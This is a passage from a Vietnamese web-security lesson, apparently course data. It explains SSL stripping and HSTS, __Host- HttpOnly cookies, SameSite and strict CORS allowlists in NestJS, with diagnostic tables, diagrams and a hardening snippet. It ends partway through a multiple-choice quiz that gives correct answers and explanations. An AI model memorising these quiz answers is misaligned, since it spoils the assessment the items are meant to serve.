Một lỗ hổng kinh điển ở tầng giao vận mạng xảy ra ngay tại **lần kết nối đầu tiên** của người dùng: khi người dùng gõ \`banking.vn\` lên thanh địa chỉ trình duyệt mà không gõ \`https://\`, trình duyệt thường thử gửi yêu cầu đầu tiên qua cổng \`HTTP (Port 80)\` không mã hóa rồi chờ máy chủ trả về lệnh chuyển hướng \`301 Moved Permanently\` sang \`https://banking.vn\`.

1. **Cuộc tấn công Tước bỏ Mã hóa (\`SSL Stripping Attack\` tại Wifi Công cộng):**
   Nếu người dùng đang ngồi ở quán cà phê sử dụng mạng Wifi công cộng bị kẻ tấn công kiểm soát (\`Man-in-the-Middle — MITM\`), kẻ tấn công sẽ chặn ngay gói tin \`HTTP Port 80\` đầu tiên đó, tự mình mở kết nối \`HTTPS\` với máy chủ ngân hàng ở phía sau, nhưng lại trả về trang web dạng \`HTTP không mã hóa\` cho nạn nhân! Toàn bộ mật khẩu và mã OTP người dùng nhập vào sẽ đi qua cáp mạng dưới dạng văn bản thô (\`Plaintext\`) và bị kẻ tấn công đọc sạch!
2. **Giải pháp Khóa Cứng Giao vận bằng \`HSTS (HTTP Strict-Transport-Security — RFC 6797)\` và \`HSTS Preload List\`:**
   Khi máy chủ NestJS trả về tiêu đề bảo mật:
   \`Strict-Transport-Security: max-age=31536000; includeSubDomains; preload\`
   - Nó ra lệnh cho trình duyệt: *"Trong suốt 1 năm tới (\`31,536,000 giây\`), bất kể người dùng hay đoạn code nào gọi tới \`http://banking.vn\` hoặc bất kỳ tên miền phụ nào của nó, trình duyệt phải **tự động biến đổi ngầm thành \`https://\` ngay bên trong bộ nhớ máy khách (Mã trạng thái nội bộ \`307 Internal Redirect\`) TRƯỚC KHI gửi bất kỳ gói tin nào ra card mạng**!"*.
   - Đặc biệt, khi đăng ký tên miền kèm cờ \`preload\` vào danh sách **\`HSTS Preload List\`** (được biên dịch cứng sẵn bên trong mã nguồn của Chrome, Firefox, Safari, Edge), ngay cả ở **lần truy cập đầu tiên trong đời**, trình duyệt cũng đã biết trước và ép buộc dùng \`HTTPS 100%\`, xóa sổ vĩnh viễn cuộc tấn công \`SSL Stripping\`!

### 3.2 Truy vết qua Mã nguồn Thực thi: Cấu hình Cookie \`__Host-\` và Helmet Security Pipeline trong NestJS

Đoạn mã dưới đây minh họa dịch vụ phát hành Cookie chuẩn \`__Host-\` kết hợp các tiêu đề phòng thủ chiều sâu (\`HSTS\`, \`CSP\`, \`X-Content-Type-Options: nosniff\`) trong ứng dụng NestJS:

\`\`\`typescript
// File: src/modules/auth/secure-cookie-issuer.service.ts
// Phát hành Cookie chuẩn __Host- và thiết lập tiêu đề bảo mật tầng mạng theo chuẩn OWASP ASVS
import { Injectable } from '@nestjs/common';

export interface CookieDirectiveOptions {
  readonly tokenValue: string;
  readonly maxAgeSeconds: number;
  readonly sameSitePolicy: 'Strict' | 'Lax';
}

export interface IssuedSecurityHeaders {
  readonly setCookieHeader: string;
  readonly strictTransportSecurity: string;
  readonly contentSecurityPolicy: string;
  readonly xContentTypeOptions: string;
}

@Injectable()
export class SecureCookieIssuerService {
  public buildHardenedAuthHeaders(options: CookieDirectiveOptions): IssuedSecurityHeaders {
    if (!options.tokenValue || options.maxAgeSeconds <= 0) {
      throw new Error('INVALID_COOKIE_ISSUER_OPTIONS');
    }

    // Sử dụng tiền tố __Host- bắt buộc đi kèm: Secure + Path=/ + KHÔNG khai báo Domain
    // Giúp khóa chặt Cookie vào đúng Origin hiện tại, chống Subdomain Cookie Tossing
    const setCookieHeader = [
      \`__Host-refresh_token=\${options.tokenValue}\`,
      \`Max-Age=\${options.maxAgeSeconds}\`,
      'Path=/',
      'HttpOnly',
      'Secure',
      \`SameSite=\${options.sameSitePolicy}\`,
    ].join('; ');

    return {
      setCookieHeader,
      strictTransportSecurity: 'max-age=31536000; includeSubDomains; preload',
      contentSecurityPolicy: "default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'",
      xContentTypeOptions: 'nosniff',
    };
  }
}
\`\`\`

### 3.3 Phương pháp Chẩn đoán Lỗi CORS, Mất Cookie Cross-Site và Lỗ hổng Header trên Production

Khi tích hợp Frontend và Backend trên môi trường Production hoặc Staging, nếu gặp lỗi chặn CORS hoặc trình duyệt không gửi Cookie lên máy chủ, kỹ sư cần tra cứu bảng chẩn đoán dưới đây:

| Triệu chứng Lỗi trên Trình duyệt | Thông báo trên DevTools Console / Network Tab | Nguyên nhân Kỹ thuật Gốc rễ | Giải pháp Khắc phục Triệt để |
| :--- | :--- | :--- | :--- |
| **Lỗi CORS chỉ xảy ra khi đổi từ tài khoản App sang tài khoản Admin** | \`The 'Access-Control-Allow-Origin' header has a value 'https://app...' that is not equal to the supplied origin 'https://admin...'\` | Máy chủ trả về Origin động theo Whitelist nhưng **thiếu tiêu đề \`Vary: Origin\`**, khiến CDN/Browser Cache trả nhầm header của App cho Admin | Luôn đính kèm \`res.setHeader('Vary', 'Origin')\` trên mọi phản hồi từ Backend hoặc cấu hình trên Reverse Proxy |
| **Trình duyệt nhận được \`Set-Cookie\` nhưng âm thầm vứt bỏ không lưu** | Biểu tượng tam giác vàng trong cột \`Set-Cookie\` của tab Network báo \`Blocked Cookie\` | Đặt \`SameSite=None\` nhưng quên cờ \`Secure\`, hoặc dùng tiền tố \`__Host-\` nhưng lại khai báo thêm thuộc tính \`Domain=...\` | Khi dùng \`SameSite=None\` bắt buộc phải chạy trên \`HTTPS\` kèm \`Secure\`; với \`__Host-\` phải xóa bỏ thuộc tính \`Domain\` và đặt \`Path=/\` |
| **Gọi API bị lỗi CORS ngay khi Backend ném lỗi \`500\` hoặc \`401\`** | Trình duyệt báo \`No 'Access-Control-Allow-Origin' header is present\` mặc dù các API \`200 OK\` vẫn chạy bình thường | Bộ lọc ngoại lệ (\`ExceptionFilter\`) hoặc cổng Nginx tự trả về trang lỗi mà không đi qua \`CORS Middleware\` của NestJS | Bật \`app.enableCors()\` ở mức toàn cục của NestJS trước các Guard/Filter và thêm từ khóa \`always\` vào chỉ thị \`add_header\` trên Nginx |
| **Mỗi lần gọi API \`POST JSON\` đều bị nhân đôi thời gian phản hồi mạng** | Trong tab Network luôn xuất hiện 1 dòng \`OPTIONS\` chạy trước mỗi dòng \`POST / PUT / DELETE\` | Máy chủ không trả về tiêu đề \`Access-Control-Max-Age\` trong phản hồi của lệnh \`OPTIONS\`, hoặc đang bật nút \`Disable cache\` trên DevTools | Thiết lập \`maxAge: 86400\` (24 giờ) trong cấu hình \`enableCors()\` của NestJS để trình duyệt lưu đệm kết quả Preflight |
| **Frontend gửi \`fetch()\` thành công nhưng máy chủ không nhận được Cookie** | Trong Request Headers gửi lên hoàn toàn không có trường \`Cookie\` dù Cookie vẫn còn hạn trong Application Tab | Phía Frontend quên truyền tùy chọn \`credentials: 'include'\` (Fetch) hoặc \`withCredentials: true\` (Axios) | Bật \`credentials: 'include'\` ở phía Client đồng thời bật \`credentials: true\` và Whitelist Origin tường minh ở phía Server |

> **Tổng kết học thuật Phần 3 (Quy tắc Kiểm toán Bảo mật Tầng Mạng trước khi Go-Live):**
> Trước khi đưa bất kỳ dịch vụ NestJS nào lên môi trường Production, kỹ sư bắt buộc phải kiểm tra 3 chốt chặn: **(1)** Không bao giờ xuất hiện tổ hợp \`Allow-Origin: *\` hoặc \`origin: true\` đi kèm \`Allow-Credentials: true\`; **(2)** Mọi Cookie chứa thông tin xác thực đều phải mang tiền tố \`__Host-\` kèm \`HttpOnly; Secure; SameSite=Lax/Strict\`; và **(3)** Kích hoạt \`Helmet\` với \`HSTS max-age >= 31536000\` và \`CSP frame-ancestors 'none'\` (chống tấn công Clickjacking).

---

# 4. HỆ THỐNG HÓA KIẾN THỨC & SƠ ĐỒ TƯ DUY (ENGINEERING MIND MAP)

### 4.1 Sơ đồ 1: Bản Đồ Tầng Bậc Hệ Thống Phòng Thủ Chiều Sâu Tầng Mạng Web (Web Network Defense-in-Depth Map)
\`\`\`diagram
[TOPOLOGY: orbital-cycle]
┌───────────────────────────────────────────────────────────────────────────────┐
│ 1. TẦNG BIÊN MÃ HÓA & KIỂM DUYỆT NGUỒN GỐC (TRANSPORT & CORS PERIMETER LAYER) │
│    [ HSTS Preload (31536000s HTTPS) ] ◄───► [ Strict Origin Whitelist + Vary: Origin ] ◄───► [ Preflight Cache (Max-Age 86400s) ] │
└──────────────────────────────────────┬────────────────────────────────────────┘
                                       │ Xác thực Quyền Cross-Origin và Trao đổi Tiêu đề Bảo mật
┌──────────────────────────────────────▼────────────────────────────────────────┐
│ 2. TẦNG LƯU TRỮ & CÔ LẬP PHIÊN XÁC THỰC (COOKIE & TOKEN ISOLATION LAYER)      │
│    ├── Tiền tố __Host- Cookie: Bắt buộc Secure + Path=/ + Cấm ghi đè Subdomain│
│    ├── Cờ HttpOnly & Secure: Cấm tuyệt đối document.cookie (Chống XSS & MITM) │
│    └── Cờ SameSite (Strict/Lax): Chặn tự động gửi Cookie từ trang lạ (CSRF)   │
└──────────────────────────────────────┬────────────────────────────────────────┘
                                       │ Khóa Nội dung Thực thi trên Nhân Trình duyệt (Browser Sandbox)
┌──────────────────────────────────────▼────────────────────────────────────────┐
│ 3. TẦNG CHÍNH SÁCH AN NINH NỘI DUNG TRÌNH DUYỆT (BROWSER SANDBOX POLICY LAYER)│
│    ├── Same-Origin Policy (SOP): Cô lập bộ nhớ giữa các bộ ba (Scheme,Host,Port)│
│    ├── Content-Security-Policy (CSP): Chặn nạp Script ngoại lai & Clickjacking│
│    └── X-Content-Type-Options (nosniff): Cấm trình duyệt tự đoán kiểu tệp MIME│
└───────────────────────────────────────────────────────────────────────────────┘
\`\`\`

### 4.2 Sơ đồ 2: Dòng Chảy So Sánh Cơ Chế Lưu Trữ Phiên Xác Thực (LocalStorage + Blind CORS vs __Host- HttpOnly Cookie + Strict Whitelist)
\`\`\`diagram
MÔ HÌNH CŨ: LƯU JWT TRONG LOCALSTORAGE KẾT HỢP PHẢN CHIẾU ORIGIN MÙ QUÁNG (ORIGIN: TRUE)
Dính 1 lỗi XSS nhỏ ──► [ Script độc đọc localStorage.getItem('jwt') ] ──► [ Gửi thẳng về Server Hacker ] ──► MẤT TÀI KHOẢN 100%
Bật origin: true + credentials = Mọi trang web lừa đảo đều gọi được API kèm Cookie và đọc trộm toàn bộ dữ liệu người dùng.

MÔ HÌNH HIỆN ĐẠI: __HOST- HTTPONLY COOKIE + SAMESITE + WHITELIST CORS KÈM VARY: ORIGIN
Tấn công XSS đọc Cookie ──┐
Tấn công CSRF gửi POST  ──┼──► [ Chặn bởi HttpOnly + SameSite=Lax/Strict + Whitelist ] ──► Vô hiệu hóa XSS & CSRF
Tấn công Subdomain      ──┘                              │
                                                         └──► Khóa chặt bởi __Host- & Vary: Origin ────► An toàn chuẩn OWASP ASVS
\`\`\`

### 4.3 Sơ đồ 3: Cây Quyết Định Kỹ Thuật (Chiến Lược Cấu Hình CORS, Lưu Trữ Token Và Cờ SameSite)
\`\`\`diagram
                    CẦN THIẾT KẾ CƠ CHẾ XÁC THỰC VÀ GIAO TIẾP API CHO ỨNG DỤNG WEB HIỆN ĐẠI?
                                                        │
                                                        ▼
                            Nên lưu trữ Refresh Token / Session Token ở đâu tại phía Trình duyệt?
                            /                                                                 \\
          LƯU VÀO LOCALSTORAGE HOẶC SESSIONSTORAGE                            LƯU VÀO __HOST- HTTPONLY + SECURE COOKIE
                        /                                                                             \\
                       ▼                                                                               ▼
   [ CẤM DÙNG CHO DỮ LIỆU NHẠY CẢM (LỖI XSS) ]                            Đặc thù luồng điều hướng của người dùng vào ứng dụng là gì?
   - Bị đọc trộm 100% qua lệnh document / localStorage                    /                                                   \\
   - Không có cơ chế cô lập khỏi thư viện npm bên thứ ba    NGÂN HÀNG / TRANG QUẢN TRỊ NỘI BỘ TỐI MẬT          ỨNG DỤNG CÓ LINK MỞ TỪ EMAIL / MẠNG XÃ HỘI
                                                                        /                                                       \\
                                                                       ▼                                                         ▼
                                                     [ BẬT SAMESITE=STRICT + WHITELIST (TỐI ƯU) ]              [ BẬT SAMESITE=LAX + VARY: ORIGIN (CHUẨN) ]
                                                     - Cấm gửi Cookie trong mọi yêu cầu từ trang ngoài         - Chặn POST/AJAX liên trang chống CSRF
                                                     - Kèm Max-Age: 86400s giảm 95% gói OPTIONS                - Vẫn giữ đăng nhập khi bấm link GET điều hướng
\`\`\`

### 4.4 Bảng tổng hợp: Ma Trận Đánh Đổi Kỹ Thuật (Đối Chiếu Các Mô Hình Lưu Trữ Và Truyền Tải Thông Tin Xác Thực)

| Tiêu Chí So Sánh | \`localStorage\` + \`Bearer Header\` | \`Cookie\` Thường (Không cờ bảo vệ) | \`__Host- HttpOnly Cookie\` (\`SameSite=Lax\`) | \`__Host- HttpOnly Cookie\` (\`SameSite=Strict\`) |
| :--- | :--- | :--- | :--- | :--- |
| **Khả năng Chống Đánh cắp qua \`XSS\`** | **Rất kém (0%)**: Lộ toàn bộ Token ngay khi dính XSS | **Rất kém (0%)**: Bị đọc trực tiếp qua \`document.cookie\` | **Rất cao**: Mã JS hoàn toàn không thể đọc được chuỗi Token | **Rất cao**: Cô lập hoàn toàn khỏi môi trường JavaScript |
| **Khả năng Chống Giả mạo \`CSRF\`** | **Miễn nhiễm tự nhiên**: Trang khác không tự gắn Header được | **Rất nguy hiểm**: Tự động gửi Cookie theo mọi form ẩn | **An toàn cao**: Chặn tự động gửi Cookie ở mọi lệnh \`POST/PUT/DELETE\` | **Tuyệt đối (100%)**: Không gửi Cookie trong bất kỳ yêu cầu liên trang nào |
| **Chống Ghi đè từ Subdomain (\`Tossing\`)** | Cô lập theo từng Origin riêng biệt | Bị ghi đè dễ dàng nếu tên miền phụ đặt \`Domain=.root.com\` | **Tuyệt đối (100%)**: Tiền tố \`__Host-\` khóa cứng vào đúng tên miền gốc | **Tuyệt đối (100%)**: Cấm mọi thuộc tính \`Domain\` mở rộng |
| **Trải nghiệm Khi Bấm Link Từ Ngoài Vào** | Giữ nguyên trạng thái đăng nhập bình thường | Giữ nguyên trạng thái đăng nhập (nhưng mất an toàn) | **Tốt**: Vẫn gửi Cookie theo liên kết điều hướng cấp cao nhất (\`GET\`) | **Bất tiện nhẹ**: Lần đầu bấm link từ Email vào sẽ không gửi kèm Cookie |

---

# 5. TỔNG KẾT HỌC THUẬT VÀ QUY TẮC THIẾT KẾ HỆ THỐNG (ENGINEERING INVARIANTS)

Để củng cố toàn bộ kiến thức trước khi phân tích mã nguồn thực tế (\`SecurityConfigurationService\`) và thực hiện bài khảo thí, sinh viên cần nắm vững 4 định đề kỹ thuật sau:

1. **Định đề Bất khả Tương thích giữa Nguồn gốc Đại diện và Thông tin Định danh (\`CORS Credential-Wildcard Incompatibility Invariant\`):** Chính sách \`Same-Origin Policy (SOP)\` và \`CORS\` là hàng rào bảo mật do nhân trình duyệt thực thi nhằm bảo vệ người dùng cuối, không phải tường lửa bảo vệ máy chủ trước các công cụ dòng lệnh. Khi giao tiếp Cross-Origin có bật cờ truyền thông tin định danh (\`Access-Control-Allow-Credentials: true\`), máy chủ bị cấm tuyệt đối trả về ký tự đại diện \`*\` hoặc phản chiếu mù quáng mọi \`Origin\` gửi lên; thay vào đó, máy chủ bắt buộc phải đối chiếu theo **Danh sách Trắng Tường minh (\`Explicit Origin Whitelist\`)** và luôn đính kèm tiêu đề **\`Vary: Origin\`** để ngăn chặn lỗi đầu độc bộ nhớ đệm CDN.
2. **Định đề Khấu hao Độ trễ Thăm dò Trước (\`Preflight Latency Amortization Invariant\`):** Mọi yêu cầu HTTP Cross-Origin sử dụng phương thức đột biến (\`PUT\`, \`PATCH\`, \`DELETE\`), định dạng \`Content-Type: application/json\` hoặc tiêu đề tùy chỉnh (\`Authorization\`, \`X-Idempotency-Key\`) đều buộc trình duyệt phải phát đi một gói tin thăm dò \`HTTP OPTIONS\` tiêu tốn thêm \`1 RTT\` mạng. Để triệt tiêu chi phí lặp lại này, máy chủ Backend bắt buộc phải đính kèm tiêu đề **\`Access-Control-Max-Age\`** (điển hình \`86,400 giây\`) trong phản hồi \`OPTIONS\` nhằm cho phép trình duyệt lưu đệm kết quả thẩm định quyền.
3. **Định đề Cô lập Phiên Xác thực Ba Chiều (\`Tri-Flag & __Host- Cookie Isolation Invariant\`):** Lưu trữ Token xác thực dài hạn trong \`localStorage\` làm phơi bày hoàn toàn hệ thống trước lỗ hổng \`XSS\`. Chuẩn mực bảo mật cấp doanh nghiệp bắt buộc lưu trữ \`Refresh Token / Session ID\` trong Cookie mang tiền tố **\`__Host-\`** đi kèm đầy đủ bộ ba cờ: **\`HttpOnly\`** (chặn đọc từ \`document.cookie\` chống XSS), **\`Secure\`** (chỉ truyền qua kênh mã hóa HTTPS chống MITM), **\`SameSite=Lax/Strict\`** (chặn gửi Cookie tự động từ trang ngoại lai chống CSRF), và \`Path=/\` không kèm thuộc tính \`Domain\` (chống tấn công ghi đè từ tên miền phụ).
4. **Định đề Khóa Cứng Kênh Mã hóa Đầu-Cuối (\`HSTS Preload & Anti-Sniffing Invariant\`):** Để vô hiệu hóa hoàn toàn cuộc tấn công hạ cấp giao thức **\`SSL Stripping\`** ngay từ gói tin đầu tiên trên mạng không tin cậy, máy chủ phải phát hành tiêu đề **\`Strict-Transport-Security: max-age=31536000; includeSubDomains; preload\`**, kết hợp với **\`Content-Security-Policy (CSP)\`** và **\`X-Content-Type-Options: nosniff\`** nhằm khóa chặt môi trường thực thi của trình duyệt.
  `,
  realCodeSnippet: `// File: src/modules/security/configuration/security-configuration.service.ts
// Trích dẫn từ dự án thực tế Arc Irobot Backend - Production Security Middleware & CORS Whitelist Pipeline
import { Injectable, Logger, INestApplication } from '@nestjs/common';
import helmet from 'helmet';
import * as cookieParser from 'cookie-parser';

export interface CorsSecurityConfig {
  readonly allowedOrigins: string[];
  readonly maxAgeSeconds: number;
}

/**
 * ADR-0033: Thiết lập phòng thủ chiều sâu tầng mạng (Defense-In-Depth Network Security):
 * 1. Helmet: Kích hoạt HSTS Preload (ép HTTPS 1 năm), CSP (chống XSS & Clickjacking) và nosniff.
 * 2. CookieParser: Phân tích và xác thực chữ ký điện tử của __Host- HttpOnly Cookie.
 * 3. Strict CORS Whitelist: Kiểm tra Origin theo Set O(1), cấm tuyệt đối '*' hoặc phản chiếu mù quáng,
 *    đồng thời NestJS tự động bổ sung header 'Vary: Origin' chống CDN Cache Poisoning.
 * 4. Cache Preflight OPTIONS: Thiết lập Max-Age 86400s (24h) để tiết kiệm 1 RTT mạng cho mỗi lệnh gọi API.
 */
@Injectable()
export class SecurityConfigurationService {
  private readonly logger = new Logger(SecurityConfigurationService.name);

  public applySecurityPolicies(app: INestApplication, config: CorsSecurityConfig): void {
    if (!config || !Array.isArray(config.allowedOrigins)) {
      throw new Error('INVALID_SECURITY_CONFIGURATION');
    }

    app.use(cookieParser());

    app.use(
      helmet({
        contentSecurityPolicy: {
          directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'"],
            styleSrc: ["'self'", "'unsafe-inline'"],
            imgSrc: ["'self'", 'data:', 'https:'],
            objectSrc: ["'none'"],
            frameAncestors: ["'none'"],
          },
        },
        hsts: {
          maxAge: 31536000,
          includeSubDomains: true,
          preload: true,
        },
      }),
    );

    const allowedSet = new Set(config.allowedOrigins);

    app.enableCors({
      origin: (origin: string | undefined, callback: (err: Error | null, allow?: boolean) => void) => {
        if (!origin || allowedSet.has(origin)) {
          return callback(null, true);
        }

        this.logger.warn(\`Chặn đứng request CORS từ Origin không nằm trong Whitelist: \${origin}\`);
        return callback(new Error('CORS_ORIGIN_NOT_ALLOWED'), false);
      },
      credentials: true,
      methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
      allowedHeaders: ['Content-Type', 'Authorization', 'x-idempotency-key', 'x-csrf-token'],
      maxAge: config.maxAgeSeconds,
    });

    this.logger.log(
      \`Đã kích hoạt chính sách bảo mật mạng thành công. Số lượng Origin trong Whitelist: \${allowedSet.size}\`,
    );
  }
}`,
  quiz: [
    {
      id: 'c3-l3-q1',
      question: 'Bản chất cốt lõi của cơ chế Cross-Origin Resource Sharing (CORS) là gì và cơ chế này được cưỡng chế thực thi bởi thành phần nào trong kiến trúc mạng?',
      options: [
        'Là cơ chế do Trình duyệt thực thi để nới lỏng có kiểm soát chính sách Same-Origin Policy nhằm bảo vệ người dùng; nó không phải tường lửa chặn hacker dùng cURL hay Postman.',
        'Là tường lửa phần cứng cấp độ gói tin TCP do các nhà cung cấp đám mây tích hợp sẵn để ngăn chặn các cuộc tấn công từ chối dịch vụ phân tán DDoS vào cổng mạng của máy chủ.',
        'Là thuật toán mã hóa khóa đối xứng chạy bên trong nhân hệ điều hành Linux nhằm bảo vệ các luồng dữ liệu truyền qua cáp quang biển không bị tin tặc nghe lén.',
        'Là bộ lọc kiểm tra cú pháp câu lệnh truy vấn cơ sở dữ liệu tự động trong NestJS giúp ngăn chặn triệt để các cuộc tấn công tiêm mã độc SQL Injection từ người dùng.'
      ],
      correctIndex: 0,
      explanation: 'CORS là cơ chế được cưỡng chế hoàn toàn bởi Trình duyệt Web (Browser-enforced mechanism) nhằm bảo vệ phiên làm việc của người dùng không bị một trang web độc hại ở tab khác đọc trộm dữ liệu. CORS hoàn toàn không bảo vệ máy chủ Backend khỏi các cuộc gọi trực tiếp bằng cURL, Postman hay script Python vì các công cụ đó không tuân theo SOP.'
    },
    {
      id: 'c3-l3-q2',
      question: 'Vì sao hầu hết các lời gọi API từ ứng dụng Frontend hiện đại (React, Vue, Angular) đều buộc trình duyệt phải gửi một gói tin Preflight Request (OPTIONS) trước?',
      options: [
        'Vì các thư viện giao diện hiện đại bắt buộc phải gửi kèm chữ ký số xác thực bản quyền mã nguồn mở lên máy chủ ứng dụng trước khi được phép hiển thị giao diện.',
        'Vì trình duyệt cần phát một gói tin rỗng để đo chính xác dung lượng bộ nhớ RAM còn trống trên máy chủ Backend trước khi quyết định gửi dữ liệu lớn lên.',
        'Vì yêu cầu sử dụng định dạng Content-Type: application/json hoặc đính kèm tiêu đề tùy chỉnh như Authorization, khiến nó vượt ra ngoài phạm vi của một Simple Request.',
        'Vì máy chủ NestJS mặc định khóa toàn bộ các cổng kết nối TCP và chỉ mở cổng sau khi nhận được mật khẩu khởi động nằm trong gói tin OPTIONS của trình duyệt.'
      ],
      correctIndex: 2,
      explanation: 'Theo đặc tả W3C Fetch, một yêu cầu chỉ được coi là Simple Request (không cần Preflight) nếu dùng GET/HEAD/POST với các header cơ bản và Content-Type chỉ thuộc 1 trong 3 loại: text/plain, multipart/form-data, hoặc application/x-www-form-urlencoded. Vì API hiện đại gửi JSON (application/json) và có Authorization header nên luôn kích hoạt OPTIONS Preflight.'
    },
    {
      id: 'c3-l3-q3',
      question: 'Thiết lập cờ HttpOnly: true kết hợp tiền tố __Host- cho Cookie chứa Refresh Token đem lại hai lớp bảo vệ an ninh mạng then chốt nào cho hệ thống?',
      options: [
        'Giúp Cookie tự động nhân đôi thời gian sống mỗi khi người dùng tải lại trang và tự động sao lưu toàn bộ lịch sử đăng nhập lên đám mây của trình duyệt.',
        'Ngăn chặn tuyệt đối mã JavaScript đọc trộm Cookie qua document.cookie khi dính lỗ hổng XSS, đồng thời khóa chặt Cookie vào đúng Origin hiện tại chống ghi đè từ Subdomain.',
        'Tự động mã hóa toàn bộ các bảng dữ liệu trong cơ sở dữ liệu PostgreSQL bằng khóa công khai của người dùng và giải phóng 50% dung lượng bộ nhớ V8 Heap.',
        'Ép buộc thiết bị của người dùng phải quét sinh trắc học khuôn mặt mỗi khi trình duyệt thực hiện đính kèm Cookie vào các yêu cầu tải hình ảnh tĩnh trên trang.'
      ],
      correctIndex: 1,
      explanation: 'Cờ HttpOnly cấm hoàn toàn môi trường JavaScript truy cập Cookie qua document.cookie, vô hiệu hóa nguy cơ bị đánh cắp Refresh Token khi trang web dính lỗi XSS. Đồng thời, tiền tố __Host- bắt buộc Cookie phải có cờ Secure, Path=/ và không có thuộc tính Domain, ngăn chặn hoàn toàn tấn công Subdomain Cookie Tossing.'
    },
    {
      id: 'c3-l3-q4',
      question: 'Vì sao việc cấu hình Access-Control-Allow-Origin: * (hoặc phản chiếu mù quáng origin: true) đi kèm với Access-Control-Allow-Credentials: true lại là lỗ hổng chí mạng?',
      options: [
        'Vì ký tự dấu sao (*) làm hỏng bộ phân tích cú pháp biểu thức chính quy bên trong nhân trình duyệt và gây tràn bộ nhớ đệm của card đồ họa trên máy khách.',
        'Vì sự kết hợp này làm tăng kích thước tiêu đề HTTP lên gấp mười lần khiến thuật toán nén HPACK của giao thức HTTP/2 bị treo cứng không thể giải nén được.',
        'Vì giao thức bảo mật TLS 1.3 không cho phép mã hóa các gói tin HTTP có chứa ký tự đại diện bên trong phần tiêu đề phản hồi của máy chủ cân bằng tải.',
        'Vì nó cho phép bất kỳ trang web độc hại nào trên Internet đều có thể gửi ngầm yêu cầu mang theo Cookie đăng nhập của nạn nhân tới máy chủ và đọc sạch dữ liệu trả về.'
      ],
      correctIndex: 3,
      explanation: 'Khi bật Credentials: true, trình duyệt sẽ đính kèm Cookie đăng nhập của người dùng vào yêu cầu Cross-Origin. Nếu cho phép mọi Origin (* hoặc phản chiếu mù quáng origin: true), bất kỳ trang web lừa đảo nào người dùng mở lên cũng có thể gọi ngầm API tới ngân hàng/ứng dụng của nạn nhân và đọc toàn bộ dữ liệu riêng tư trả về. Do đó trình duyệt cấm * đi kèm Credentials.'
    },
    {
      id: 'c3-l3-q5',
      question: 'Sự khác biệt hành vi chính xác giữa hai chế độ cờ SameSite=Lax và SameSite=Strict khi người dùng bấm vào một đường link từ Email hoặc Mạng xã hội dẫn về trang web của bạn là gì?',
      options: [
        'Chế độ SameSite=Lax chặn hoàn toàn việc gửi Cookie trên mọi giao thức mạng, trong khi chế độ SameSite=Strict vẫn cho phép gửi Cookie qua kết nối HTTP không mã hóa.',
        'Chế độ SameSite=Lax chỉ cho phép gửi Cookie trong các biểu mẫu POST ẩn, còn chế độ SameSite=Strict chỉ cho phép gửi Cookie khi tải các tệp tin hình ảnh định dạng PNG.',
        'Với SameSite=Strict, trình duyệt không gửi Cookie ngay cả khi người dùng bấm link điều hướng vào (bị mất trạng thái đăng nhập); với SameSite=Lax, Cookie vẫn được gửi theo lệnh GET điều hướng cấp cao nhất.',
        'Cả hai chế độ SameSite=Lax và SameSite=Strict đều có hành vi xử lý gói tin giống hệt nhau trong mọi tình huống trên tất cả các trình duyệt web đạt chuẩn W3C.'
      ],
      correctIndex: 2,
      explanation: 'SameSite=Strict chặn gửi Cookie trong mọi yêu cầu xuất phát từ trang ngoài, kể cả khi người dùng chủ động click vào một đường link GET thông thường (khiến người dùng vừa mở link thấy mình chưa đăng nhập). SameSite=Lax vẫn chặn toàn bộ các yêu cầu ngầm Cross-Site (POST form, AJAX, iframe) để chống CSRF, nhưng cho phép gửi Cookie khi người dùng điều hướng cấp cao nhất (Top-level GET navigation).'
    },
    {
      id: 'c3-l3-q6',
      question: 'Khi máy chủ Backend kiểm tra Origin theo danh sách trắng (Whitelist) và trả về động đúng Origin của bên gọi trong Access-Control-Allow-Origin, tại sao bắt buộc phải kèm thêm header Vary: Origin?',
      options: [
        'Để ngăn chặn lỗi Đầu độc Bộ nhớ Đệm (CORS Cache Poisoning): báo cho CDN và Browser Cache phải lưu tách biệt phản hồi theo từng Origin, tránh trả nhầm header của App cho trang Admin.',
        'Để yêu cầu trình duyệt tự động thay đổi địa chỉ IP nguồn của máy khách sau mỗi lần gọi API nhằm ẩn danh hoàn toàn danh tính người dùng trên mạng Internet.',
        'Để ép buộc hệ điều hành của máy chủ phải phân bổ các yêu cầu đến từ các tên miền khác nhau vào các lõi vi xử lý vật lý hoàn toàn tách biệt nhau.',
        'Để tắt cơ chế kiểm tra chứng chỉ số SSL của trình duyệt khi ứng dụng đang chạy thử nghiệm trên môi trường máy chủ cục bộ localhost của lập trình viên.'
      ],
      correctIndex: 0,
      explanation: 'Nếu máy chủ trả về Access-Control-Allow-Origin động theo từng domain trong Whitelist (ví dụ app.domain.com và admin.domain.com) mà thiếu header Vary: Origin, lớp CDN hoặc bộ đệm trung gian sẽ lưu cache phản hồi đầu tiên (chứa Allow-Origin: app.domain.com) cho URL đó và trả lại bản cache này khi admin.domain.com gọi tới, gây lỗi chặn CORS trên trang Admin.'
    },
    {
      id: 'c3-l3-q7',
      question: 'Tiêu đề bảo mật Strict-Transport-Security (HSTS) kết hợp cờ preload do máy chủ gửi về cho trình duyệt giúp triệt tiêu loại hình tấn công mạng nguy hiểm nào?',
      options: [
        'Tấn công làm tràn bộ nhớ đệm ngăn xếp (Stack Buffer Overflow) bên trong động cơ biên dịch mã máy TurboFan JIT của máy ảo JavaScript V8.',
        'Tấn công tiêm mã truy vấn bất hợp pháp (NoSQL Injection) thông qua các trường dữ liệu JSON gửi lên trong phần thân của gói tin đăng nhập.',
        'Tấn công từ chối dịch vụ ở tầng ứng dụng bằng cách gửi hàng vạn khung hủy luồng liên tiếp (HTTP/2 Rapid Reset Attack) trên cùng một kết nối.',
        'Tấn công hạ cấp giao thức (SSL Stripping) và nghe lén Man-in-the-Middle ở lần kết nối đầu tiên, bằng cách buộc trình duyệt luôn tự chuyển http:// sang https:// trước khi gửi gói tin.'
      ],
      correctIndex: 3,
      explanation: 'HSTS (HTTP Strict-Transport-Security) ra lệnh cho trình duyệt trong suốt khoảng thời gian max-age (ví dụ 1 năm) phải tự động chuyển đổi nội bộ mọi kết nối http:// sang https:// trước khi phát gói tin ra card mạng. Khi kết hợp với danh sách HSTS Preload cài sẵn trong trình duyệt, nó chặn đứng hoàn toàn cuộc tấn công SSL Stripping ngay cả ở lần truy cập đầu tiên.'
    },
    {
